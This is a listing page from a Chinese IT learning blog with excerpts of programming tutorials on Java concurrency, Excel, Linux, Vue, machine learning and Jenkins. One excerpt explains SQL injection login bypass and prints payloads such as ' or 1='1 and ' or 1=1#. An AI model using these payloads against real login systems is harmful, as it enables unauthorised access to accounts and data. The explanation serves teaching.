<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="IT学习者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="IT学习者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c23d208f7becfaba845f88a0edf914ed/" rel="bookmark">
			线程不安全的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、此时我们需要知道造成线程不安全的原因
二、我们一条一条分析，看是否能改变，即加上一些操作使多线程变得安全
synchronized的作用
修饰方法
修饰代码块
刷新内存
可重入
其他语言产生死锁的原因是
Java没有产生死锁的原因
注意
标准库中（集合类）线程安全的类
Vector（“弃用”）
HashTable
Stack
ConcurrentHashMap
StringBuffer
String
volatile关键字
那么什么时候该用到volatile呢？
三、JMM(java memory model)java内存模型【重点】
四、synchronized和volatile的区别【经典面试题】 一、此时我们需要知道造成线程不安全的原因 1.线程之间是抢占式执行的
2.多个线程修改同一个变量
3.原子性
4.内存可见性
5.指令重排序
二、我们一条一条分析，看是否能改变，即加上一些操作使多线程变得安全 1.对于第一条，我们没有办法，因为这种执行方式是由操作系统的内核实现的，我们改变不了
2.对于第二条，
一个线程修改一个变量，没有线程安全问题，结果确定；
多个线程读取同一变量，也没有线程安全问题，读只是单纯的把内存中的数据放到CPU中；
多个线程修改不同的变量，举例来说就是十个线程修改十个变量，一对一的关系，也没有线程安全问题，这个类似于第一种情况
所以为了规避线程安全问题，可以变换代码的组织形式，让一个线程只修改一个变量，但是有些场景下可以这么变换，有些却不可以。
3.对于第三条，像++这样的操作，本质上是三个步骤，是一个“非原子”的操作
像=这样的操作，本质上是一个步骤，是一个“原子”操作，++操作本身不是原子操作，可以通过加锁（synchronized）的方式，把这个操作变成原子操作，因此它是可以改变的。
public class ThreadDemo16 { static class Counter{ public int count=0; synchronized public void increase(){ count++; } } public static void main(String[] args) throws InterruptedException { Counter counter=new Counter(); Thread t1=new Thread(){ @Override public void run() { for (int i = 0; i &lt; 50000; i++) { counter.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c23d208f7becfaba845f88a0edf914ed/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1000fbe8f6f98306d85f3d2804c43608/" rel="bookmark">
			excel数据分析 - 10个清洗文本类函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1. FIND 位置查找函数
2. SEARCH 字符查找函数
3. LEFT / RIGHT/ MID 字符截取函数
4. CONCATENATE 文本串联函数
5. LEN 计算字符长度函数
6. LENB 计算双字节字符长度函数
7. TRIM 空格清理函数
8. REPLACE 位置替换函数 9. SUBSTITUTE 字符替换函数
10. TEXT 文本转换函数
①按指定格式，将数值转换为文本
②其他文本清洗方法：利用记事本
③将文本转换为数值
11.用查找和替换的注意点
1. FIND 位置查找函数 =FIND（待查找的字符，选中单元格，开始位置num） 字符记得加引号 找出字符串的位置，可查找1个or多个字符。 如不填写开始位置，则从选中单元格的第一个字符开始查找 e.g. A1单元格内容为“基础k内容”，需查找A1单元格中字符‘k’的位置 =find(''k'',A1,1) = 3 2. SEARCH 字符查找函数 =search(待查找的字符串,待查找的单元格,起始位置num)查找一个字符串，在另一个字符串的位置，不区分大小写 e.g. A1单元格内容为“基础k内K容”，需查找A1单元格中第一个出现‘k’的位置 =search("k",A1,1) = 3 3. LEFT / RIGHT/ MID 字符截取函数 ① LEFT函数 =LEFT（选中单元格，截止位置num）从文本字符串的左边第一个字符开始，返回指定个数的字符如未注明截止位置num，则返回左边第1个字符； 如注明截止位置num＞文本长度，则返回整个文本；如所注明的字符串为0，则返回空值。 e.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1000fbe8f6f98306d85f3d2804c43608/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0b28dd0fa29e9990f7ecdd52f355e0bf/" rel="bookmark">
			Shell | 查看进程的方法的不完全总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文对查看进程的几种方法进行不完全总结 1’ 2。
Updated: 2022 / 8 / 22
Shell | 查看进程的方法的不完全总结 psauxelf toppstree-aup 参考链接 进程是在 CPU 及内存中运行的程序代码，而每个进程可以创建一个或多个进程（父子进程）。
方法：
ps auxps -elf ps Linux 中的 ps 命令是 Process Status 的缩写。
ps 命令是最基本同时也是非常强大的进程查看命令。
ps 命令用来列出系统中当前运行的那些进程。
ps 命令列出的是当前那些进程的 快照，就是执行 ps 命令的那个时刻的那些进程，如果想要动态的显示进程信息，就可以使用 top 命令。
ps 命令用于报告当前系统中的进程状态，可以搭配 kill 指令随时中断、删除不必要的程序。
使用 ps 命令可以确定有哪些进程正在运行，以及运行的状态、进程是否结束、进程有没有僵死 ( z )、哪些进程占用了过多的资源（cpu 和内存）等等，总之大部分信息都是可以通过执行该命令得到的。
aux ps 指令有很多的参数，不同的参数的功能不同：
ps aux 是以简单列表的形式显示出进程信息,
选项含义a显示当前终端下的所有进程信息，包括其他用户的进程。u使用以用户为主的格式输出进程信息，user 为第一列; 如果没有 u 参数，则 PID 是第一列。x显示当前用户在所有终端下的进程。 ps aux 命令的输出如下所示：
以上信息的字段的含义解释如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0b28dd0fa29e9990f7ecdd52f355e0bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aef1c9d8f915faa133fd2d23c0dd79f0/" rel="bookmark">
			react 模态框 嵌套from 表单 关闭模态框清空表单值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 react 模态框关闭并且自动清空表单值 需要这样设置
1. 模态框 Drawer 设置 destroyOnClose = { true }
2. 表单 Form 设置 preserve = { false }
这样模态框在关闭的时候就会自动重置表单了 不需要使用 form.resetFields(); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/42d002fb700249825b53160f11a02b90/" rel="bookmark">
			目标检测算法---将数据集为划分训练集和验证集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在做深度学习目标检测模型训练的时候，首先是要获取数据集，然后再对数据集进行标注。然后再把标注完的数据集划分为训练集和验证集，这样更加方便模型的训练和测试。首先上划分数据集的代码。
import os, random, shutil def moveimg(fileDir, tarDir): pathDir = os.listdir(fileDir) # 取图片的原始路径 filenumber = len(pathDir) rate = 0.1 # 自定义抽取图片的比例，比方说100张抽10张，那就是0.1 picknumber = int(filenumber * rate) # 按照rate比例从文件夹中取一定数量图片 sample = random.sample(pathDir, picknumber) # 随机选取picknumber数量的样本图片 print(sample) for name in sample: shutil.move(fileDir + name, tarDir + "\\" + name) return def movelabel(file_list, file_label_train, file_label_val): for i in file_list: if i.endswith('.jpg'): # filename = file_label_train + "\\" + i[:-4] + '.xml' # 可以改成xml文件将’.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/42d002fb700249825b53160f11a02b90/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3dade6639d4c93d5f3f3d57c7eacb56c/" rel="bookmark">
			labelimg标注的VOC格式标签xml文件和yolo格式标签txt文件相互转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1 labelimg标注VOC格式和yolo格式介绍
1.1 voc格式
1.2 yolo数据格式介绍
2 voc格式数据和yolo格式数据相互转换
2.1 voc转yolo代码
2.2 yolo转voc格式代码 1 labelimg标注VOC格式和yolo格式介绍 labelimg标注工具怎么安装和使用在我的博客中已经讲解了，有需要可以看看，博客。
1.1 voc格式 VOC格式文件保存在和图像名称一样的xml文件中，xml文件中的标注信息如下图所示：文中红色框中保存着标注图片的主要信息。第一个红色框中里面显示着图片的保存在哪个文件夹中，标签对应的图片名称，还有图片保存的绝对路径。第二个红色框中的信息为标签图片的大小尺寸和通道，正常都是3通道。第三个红色框中的信息为图中标注的对象的信息，分别为该目标对象的属于哪一类，可以看出该对象名称为boat，然后还有标注框的两个点，分别为框的起始点和终结点。第四个红色框中的信息和第三个框框一样，都是我们标注对象的信息，不过该对象为cat。
1.2 yolo数据格式介绍 yolo数据格式，是把每个图片的标注信息保存在一个和图片名称一样的txt文件中。txt文件中的信息如下图所示：
0 0.47416020671834624 0.4523809523809524 0.5968992248062015 0.683982683982684 1 0.874031007751938 0.4069264069264069 0.1227390180878553 0.2727272727272727 每一行代表标注的一个目标，第一个数字代表着这个数的类别，第一类目标就是0，第二类目标就是1，以此类推。后面的四个数字是归一化后的的标注的中心点坐标和归一化标注框的长和宽。
2 voc格式数据和yolo格式数据相互转换 2.1 voc转yolo代码 import xml.etree.ElementTree as ET import pickle import os from os import listdir, getcwd from os.path import join def convert(size, box): x_center = (box[0] + box[1]) / 2.0 y_center = (box[2] + box[3]) / 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3dade6639d4c93d5f3f3d57c7eacb56c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f4aea99692f3de0b59d8624bf200c6dc/" rel="bookmark">
			Git版本控制管理——Git和GitHub
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前已经对Git和Git的相干命令操作等做了简单地说明。但同时既然提到Git，就一定会提到GitHub。
GitHub可以认为是一个代码托管平台，用户可以使用其来对自己的版本库进行管理，同时也可以参考借鉴甚至复刻他人的项目，总结来说，就是为开源代码提供版本库。
在介绍GitHub之前，首先需要注册自己的账号。
创建GitHub的版本库 在创建完账号之后，只需要点击new repository按钮就可以创建新版本库。
唯一必需的信息是版本库的名字，也可以设置项目的描述信息和项目首页的URL。
然后需要设置一些版本库的初始信息。根据是否已经有提交，存在两种途径：
README Seeding：如果项目第一步是在编写代码前创建GitHub版本库，那么需要创建一个占位符文件作为第一次提交。在创建新版本库时，可以选择是否创建README文件和.gitignore文件。之后，项目可以使用命令git clone url克隆到本地，然后在本地添加和提交代码。添加远程版本库：如果用户已经有了一个本地版本库，便可以将GitHub的地址和已经存在的本地版本库链接起来。此时可以利用git remote add url将GitHub的URL添加到已经存在的Git版本库中。 这之后，本地版本库已经链接到远程版本库，本地版本库的内容可以推送到GitHub。此时可以使用git push remote branch。
一些功能 随便点开一个项目，会出现上述的几个按钮：
watch：功能类似于“关注”fork：类似复制，可以将该项目同等拷贝到自己账号下star：功能类似于“点赞”code：表示项目具体内容pull request：这里显示的是合并请求列表，是项目核心者才能够进行管理的操作。当某用户完成了修改，并将之提交到某个命名分支，并且将这个新分支推送到复刻时，其可以转变为合并请求。合并请求是在任何用户进行了其觉得有用的提交操作的情况下，向核心项目拥有者发送的通知。点击某一项之后，会出现对合并请求的评论，对提交的评论和对某行代码的评论等内容 而其中诸如通知，搜索等功能，GitHub也有提供。用户可在整个平台上搜索自己感兴趣的内容，进行学习交流。
其实GitHub的说明并不复杂，其主要为广大的用户提供了一个平台，而该平台利用Git这一工具有效地促进了整个社区的发展和壮大。目前在GitHub上，用户可以搜索到很多高质量的项目，通过不断地研究交流，也会提升个人和整个社区的质量。这应该也是个人可以和其它同行得以交流，协作开发的重要途径。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/212ea119298d3f08c169b060315988fb/" rel="bookmark">
			Java读写锁ReentrantReadWriteLock原理详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		介绍 ReentrantLock属于排他锁，这些锁在同一时刻只允许一个线程进行访问，而读写锁ReentrantReadWriterLock在同一时刻可以允许多个线程访问，但是在写线程访问时，所有的读和其他写线程都被阻塞。读写锁维护了一对锁，一个读锁和一个写锁，通过分离读锁和写锁，使得并发性相比一般的排他锁有了很大提升。 下面我们来看看读写锁ReentrantReadWriter特性 公平性选择：支持非公平（默认）和公平的锁获取模式，非公平的吞吐量优于公平； 重入性：该锁支持重入锁，以读写线程为例：读线程在获取读锁之后，能够再次读取读锁，而写线程在获取写锁之后可以同时再次获取读锁和写锁 ；锁降级：遵循获取写锁，获取读锁再释放写锁的次序，写锁能够降级为读锁； 读写锁接口详解 ReentrantReadWriterLock是ReadWriterLock的接口实现类，但是ReadWriterLock接口仅有读锁、写锁两个方法
public interface ReadWriteLock { /** * Returns the lock used for reading. * * @return the lock used for reading. */ Lock readLock(); /** * Returns the lock used for writing. * * @return the lock used for writing. */ Lock writeLock(); } ReentrantReadWriteLock自己提供了一些内部工作状态方法，例如
/** * 返回当前读锁被获取的次数，该次数不等于获取锁的线程数，因为同一个线程可以多次获取支持重入锁 * Queries the number of read locks held for this lock. This * method is designed for use in monitoring system state, not for * synchronization control.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/212ea119298d3f08c169b060315988fb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e720ea8a72cb0bff03a42ab371f6f75b/" rel="bookmark">
			vue静态资源的引用(相对路径,绝对路径,@,~的一些笔记,以图片引入为例,含在线演示)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前置 配合在线演示看更好~@在线演示地址 引入的方式 相对路径的引用 webpack的处理 路径以.开头,会被 webpack 处理在其编译过程中，所有诸如&lt;img src="..."&gt;、background: url(...) 和 CSS @import 的资源 URL 都会被解析为一个模块依赖。 例如,url(./image.png)会被编译为require("./image.png")而:
&lt;img src="./image.png"&gt; 将会被编译到：
h('img', { attrs: { src: require('./image.png') }}) 并且,会根据图片的大小来决定是否转化为base64编码图片 相对路径下的URL转换规则 如果 URL 以 . 开头，它会作为一个相对模块请求被解释且基于你的文件系统中的目录结构进行解析。 大白话就是哪里引入的,就相当与哪一个文件的路径 &lt;img src="./img/28.jpg" alt="" /&gt;就表示引入当前组件下img目录下的28.jpg文件 示例如下
src/components/HelloWorld.vue
&lt;template&gt; &lt;div class="hello"&gt; &lt;!-- 相对路径的引入静态资源 --&gt; &lt;img src="./img/28.jpg" alt="" /&gt; &lt;/div&gt; &lt;/template&gt; 引入的就是src/components/img/28.jpg,参照于HelloWord.vue所在的路径,也就是以src/components为起始点,去寻找img目录下的28.jpg文件
绝对路径的引用 需要知道的是在vue当中,绝对路径的表示是以URL为/开头的,或是省略了/或者是. 比如/images/foo.png就表示是一个绝对路径在vue当中images/foo.png也表示一个绝对路径在vue当中 webpack的处理 依旧会根据图片的大小来决定是否转化为base64编码图片 绝对路径下的URL转换规则 绝对路径的表示是以URL为/开头的,或是省略了/或者是.
比如/images/foo.png就表示是一个绝对路径在vue当中
images/foo.png也表示一个绝对路径在vue当中
转换规则很简单,绝对路径的转换规则就是以public为起始点
&lt;img src="/resource/img/pic1.png" alt="" /&gt;就表示引入public/img/pic1.png文件 示例代码如下
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e720ea8a72cb0bff03a42ab371f6f75b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00af2af3150bbae0fe2f103034fca222/" rel="bookmark">
			KNN分类算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		KNN介绍 最近邻 (k-Nearest Neighbors， KNN) 算法是一种分类算法， 1968年由 Cover和 Hart 提出， 应用场景有字符识别、 文本分类、 图像识别等领域。
该算法的思想是： 一个样本与数据集中的k个样本最相似， 如果这k个样本中的大多数属于某一个类别， 则该样本也属于这个类别。
图中绿色的点就是我们要预测的那个点，假设K=3。那么KNN算法就会找到与它距离最近的三个点（这里用圆圈把它圈起来了），看看哪种类别多一些，比如这个例子中是蓝色三角形多一些，新来的绿色点就归类到蓝三角了。
但是， K=5这次变成红圆多一些，所以新来的绿点被归类成红圆。从这个例子中，我们就能看得出K的取值是很重要的。
KNN实现步骤 1. 计算距离（欧几里得距离或者马氏距离）
欧几里得距离(二维)：
马氏距离：
2. 升序排列
3. 取前K个
K的取值
K太大：导致分类模糊
K太小：受个例影响，波动较大
4. 加权平均
经验
KNN算法求病人癌症检测的正确率 K值选择 通过交叉验证（将样本数据按照一定比例，拆分出训练用的数据和验证用的数据，比如6：4拆分出部分训练数据和验证数据），从选取一个较小的K值开始，不断增加K的值，然后计算验证集合的方差，最终找到一个比较合适的K值。
当你增大k的时候，一般错误率会先降低，因为有周围更多的样本可以借鉴了，分类效果会变好。但注意，和K-means不一样，当K值更大的时候，错误率会更高。这也很好理解，比如说你一共就35个样本，当你K增大到30的时候，KNN基本上就没意义了。
所以选择K点的时候可以选择一个较大的临界K点，当它继续增大或减小的时候，错误率都会上升，比如图中的K=10。具体如何得出K最佳值的代码
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b71c431942950133281a09ded134eb8b/" rel="bookmark">
			数据结构——非线性结构（树与二叉树）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一. 非线性结构的概述二. 树的基本概念1. 树的定义2. 专业术语3. 树的性质 三. 树的分类1. 一般树2. 二叉树（是有序树）2.1 概念2.2 分类1. 一般二叉树2. 满二叉树3. 完全二叉树 2.3 二叉树的性质2.3.1 二叉树的常考性质2.3.2 完全二叉树的常考性质 3. 森林 四. 树的存储1. 来源2. 二叉树的存储2.1 连续存储（必须转化为完全二叉树）2.2 链式存储2.2.1 二叉树链式存储结构描述 3. 一般树的存储（用线性来存储非线性结构方法）3.1 双亲表示法（求父节点方便）3.2 孩子表示法（求子节点方便）3.3 双亲孩子表示法（求父节点和子节点都很方便）3.4 孩子兄弟表示法（二叉树表示法） 4. 森林的存储4.1 森林转化为二叉树4.2 存储方法4.3 转化方法 五. 树的操作1. 二叉树的遍历1.1 先序遍历（先访问根节点）1.2 中序遍历（中间访问根节点）1.3 后序遍历（最后访问根节点）1.4 层次遍历1.5 已知两种遍历序列求原始二叉树 2. 森林的遍历2.1 先序遍历森林2.2 中序遍历森林 六. 树与二叉树的应用1. 树是数据库中数据组织的一种重要形式2. 操作系统子父进程关系本身就是一棵树3. 面向对象语言中类的继承关系本身就是一棵树4. 线索二叉树4.1 线索二叉树的基本概念4.2 二叉树的基本操作4.2.1 二叉树的线索化构造4.2.2 线索二叉树找前驱/后继 7. 哈夫曼树（最优二叉树）7.1 基本概念7.1.1 节点的权、带权路径长度7.1.2 哈夫曼树的定义 7.2 哈夫曼树的构造7.3 哈夫曼编码 一.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b71c431942950133281a09ded134eb8b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3bd20c1fe36727676663c0fc46844d79/" rel="bookmark">
			sql注入之or 1 = 1
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		select * from users where username='$username' and password='$password'
众所周知，
一般的结构查询语句的结构如下：
SELECT *
FROM table_a
WHERE x=y
其中，以上语句的select,from,where是不区分大小写的，一般分行写select,from,where语句。select一般是查询结果要展示的字段，from后一般是要查询的表名，where是进行行数据筛选的条件。
而sql注入中，username和passwd未知的情况下，我们可以通过注入来绕过后端的检测，比如
or 1 = 1
select * from users where username=' ' or 1='1' and password='123'
注：输入的是 ' or 1 = '1,单引号必须带，不然会语法错误，应为有逻辑关系的存在，and优先级比or高，所以先执行and后的内容与前面相匹配，而passwd为123是真，（数据库里保存的passwd值不存在猜测值时，建议前后同时饶过）看前面的内容username的值，而这里出现了or，逻辑比较的时候，1=1恒成立，也就意味着and前真后真是成立的，从而进行绕过
还有一种，or 1= 1#，在sql语法里，#是注释符以后的内容全省略，
且SQL语句中where相当于判断语句，由 or 连接，则：
select * from users where username=' ' or 1=1#' and password='ijcjds'
等于
select * from users where username=' ' or 1=1
or进行运算，1=1恒成立为真，则全真
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/abfbe99397eaedddc5375998f72f0443/" rel="bookmark">
			drm 学习笔记-1：ubuntu编译运行modetest
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景 平常工作中会涉及图形图像的问题，比如丢帧、黑屏等问题，处理底层问题较多，对DRM\KMS等相关知识一直比较模糊。平常想抽时间系统的学习下这部分知识，也是着手搭建下环境。因为前端时间有使用modetest工具，首先从本地编译运行modetest开始。
环境准备 modetest是由libdrm提供的测试程序，可以查询显示设备的支持状况，进行基本的显示测试，以及设置显示的模式。本地通过编译libdrm获取modetest工具，编译环境要求：python&gt;3.6，本人使用的
vmware平台：ubuntu16.04
libdrm-2.4.112：入口
libdrm编译环境 python3.8下载 编译使用的是meson和ninja，需要首先准备python环境。ubuntu16.04默认是python2.7和pyhton3.5的，需要准备python3.6以上版本，本次使用的是python3.8.10,通过源码进行的编译。
python3.8源码：入口。（阿里镜像，下载很快）
//1、创建安装路径 mkdir /usr/local/python3.8 //2.如果不是root，需要赋权限 chmod 777 -R /usr/local/python3.8 //3、解压python3.8.10，运行环境配置 ./configure --prefix=/usr/local/python3.8/ //4、编译安装 make &amp;&amp; make install //5、 设置默认python3.8为默认版本，删除原有的软连接，创建python3.8的新软连接 rm -rf /usr/bin/python3 ln -s /usr/local/python3.8/bin/python3.8 /usr/bin/python3 //6. 添加环境变量，在/etc/profile最后添加上 export PATH=/usr/local/python3.8/bin:$PATH 可以通过查看python确认是否安装成功：
更新pip3 更改python版本后会出现pip3兼容问题，当安装meson时报错：
subprocess.CalledProcessError: Command '('lsb_release', '-a')' returned non-zero exit status 1。
尝试了网上的很多版本未能成功，由于很多博主写文章的时候细节没有描述详细。
本人的解决方法：通过get-pip.py脚本重新安装。这里的get-pip.py和python版本一定要对应。
然后命令安装：
//python3 xxx, xxx为get-pip.py路径 python3 '/root/Desktop/Python-3.8.10/get-pip.py' //查看版本是否成功 pip3 --version meson安装 如果meson已经安装，可能版本比较老，可以先删除，然后通过pip3安装。这里需要先配置一下pip的国内源，不然meson可能会下载失败：
// 1、创建文件夹
mkdir ~/.pip
// 2、添加配置文件
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/abfbe99397eaedddc5375998f72f0443/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3460c8dcf672b8a832e8336806f6f2f1/" rel="bookmark">
			软件工程考点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		软件工程上午题10分+ CMM（能力成熟度模型） 真题 真题1 真题2 真题3 真题4 能力成熟度集成模型（CMMI） 能力等级0指未执行过程，表明过程域的一个或多个符足目仍没有被满足;
能力等级1指过程通过转化可识别的输入工作产品，产生可识别的输出工作产品，关注于过程域的特定目标的完成;
能力等级2指过程作为已管理的过程制度化，关注于针对单个过程实例的能力;
能力等级3指过程作为已定义的过程制度化,关注过程的组织级标准化和部署
能力等级4指过程作为定量管理的过程制度化;
能力等级5指过程作为优化的过程制度化，表明过程得到很好地执行且持续得到改进。
真题 真题1 真题2 真题3 真题4 瀑布模型 瀑布模式适合开发需求明确的，需求大致固定不会随意变更的系统
V模式的关键字在于质量保证活动和沟通，基本问题逐步细化
真题 真题1 有过类似的开发经验那就是暗示该系统的需求很明确了
真题2 替换原有的系统也是暗示需求明确
真题3 系统的功能有清晰的定义暗示需求明确
真题4 真题5 真题6 真题7 增量模型 增量模型拥有瀑布模型的所有优点
它主要的特点是可以快速构造可运行的产品
真题 真题1 真题2 真题3 真题4 真题5 真题6 原型模型 原型模型不适合大规模的系统开发
真题 真题1 真题2 真题3 螺旋模型 螺旋模型的特点是加入了风险分析，适合大规模高风险的，需求变化的系统
真题 真题1 真题2 真题3 喷泉模型 真题 真题1 真题2 真题3 统一过程（UP）模型 真题 真题1 真题2 真题3 真题4 真题5 敏捷开发 极限编程（XP） 真题 真题1 真题2 真题3 真题4 真题5 真题6 真题7 真题8 讲解地址：https://www.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3460c8dcf672b8a832e8336806f6f2f1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b2dd46b57cc52ca2b67ae99d59b2746/" rel="bookmark">
			vant3的option写法示例（部分组件：swipe、popup、picker、stepper、field、tab、tabbar）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vant3的option写法示例 安装组件使用swipe 轮播基础用法懒加载监听 change 事件纵向滚动自定义滑块大小自定义指示器 Popup 弹出层弹出位置关闭图标圆角弹窗指定挂载位置 Picker 选择器基础用法选项配置顶部栏 默认选中项多列选择级联选择禁用选项动态设置选项加载状态搭配弹出层使用自定义 Columns 的结构 Stepper 步进器基础用法步长设置限制输入范围限制输入整数禁用状态禁用输入框固定小数位数自定义大小异步变更圆角风格 Field 输入框基础用法自定义类型禁用输入框显示图标错误提示插入按钮格式化输入内容高度自适应显示字数统计输入框内容对齐 Tab 标签页基础用法通过名称匹配标签栏滚动禁用标签样式风格点击事件粘性布局收缩布局自定义标签切换动画滑动切换滚动导航异步切换 Tabbar 标签栏基础用法通过名称匹配徽标提示自定义图标自定义颜色监听切换事件路由模式 现在vant官方文档对应vue3的全部是CompositionApi写法，对于一些刚上手，还在用optionsApi的人不友好。现在将一部分组件的文档写法改为optionsApi写法 安装 参考官方文档安装即可：快速上手
注意：
如果你用的是这个按需引入的方法 那么可能会遇到报错
解决方法:Cannot use ‘import.meta‘ outside a module Vant按需引入报错
安装低版本的
npm i unplugin-vue-components@0.22.0 组件使用 我只是将官方示例写法进行修改，效果还是看官方文档
swipe 轮播 基础用法 每个 SwipeItem 代表一张轮播卡片，可以通过 autoplay 属性设置自动轮播的间隔。
&lt;van-swipe class="my-swipe" :autoplay="3000" indicator-color="white"&gt; &lt;van-swipe-item&gt;1&lt;/van-swipe-item&gt; &lt;van-swipe-item&gt;2&lt;/van-swipe-item&gt; &lt;van-swipe-item&gt;3&lt;/van-swipe-item&gt; &lt;van-swipe-item&gt;4&lt;/van-swipe-item&gt; &lt;/van-swipe&gt; &lt;style&gt; .my-swipe .van-swipe-item { color: #fff; font-size: 20px; line-height: 150px; text-align: center; background-color: #39a9ed; } &lt;/style&gt; 懒加载 当 Swipe 中含有图片时，可以通过 lazy-render 属性来开启懒加载模式。在懒加载模式下，只会渲染当前页和下一页。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b2dd46b57cc52ca2b67ae99d59b2746/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cdb92045a23008ae7d8ea4c243035403/" rel="bookmark">
			Putty 隧道穿透远程桌面访问
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【使用putty通过跳板机打隧道访问内【使用putty通过跳板机打隧道访问内网服务器】_山墨云微的博客-CSDN博客_通过跳板机访问服务器
【使用putty通过跳板机打隧道访问内
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b6b99c279c93b087f1b6fcbe0b7d01b2/" rel="bookmark">
			jenkins配置ssh服务器&amp;配置ssh servers
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		jenkins配置ssh服务器 1.系统管理-》配置-》Publish over SSH2.生成秘钥2.1已有秘钥无须在生成，只需要吧公钥配置到将要配置的ssh server服务器上即可。2.2 第一次配置需要秘钥 3. 配置秘钥4.补充 1.系统管理-》配置-》Publish over SSH 当然，没有这个插件的第一时间去插件管理里面去下载
2.生成秘钥 任意找一台服务器，生成即可。
2.1已有秘钥无须在生成，只需要吧公钥配置到将要配置的ssh server服务器上即可。 authorized_keys 公钥放到服务器上 /root/.ssh/文件夹下即可。
当测试显示Success即表明配置完成！
2.2 第一次配置需要秘钥 1、找到一台服务器执行
ssh-keygen -t rsa 会在目录/root/.ssh生成id_rsa私钥、id_rsa.pub公钥，将公钥的内容写入到同目录下的authorized_keys文件（jenkins连接多台服务器，将公钥写入到相应服务器的authorized_keys文件即可）
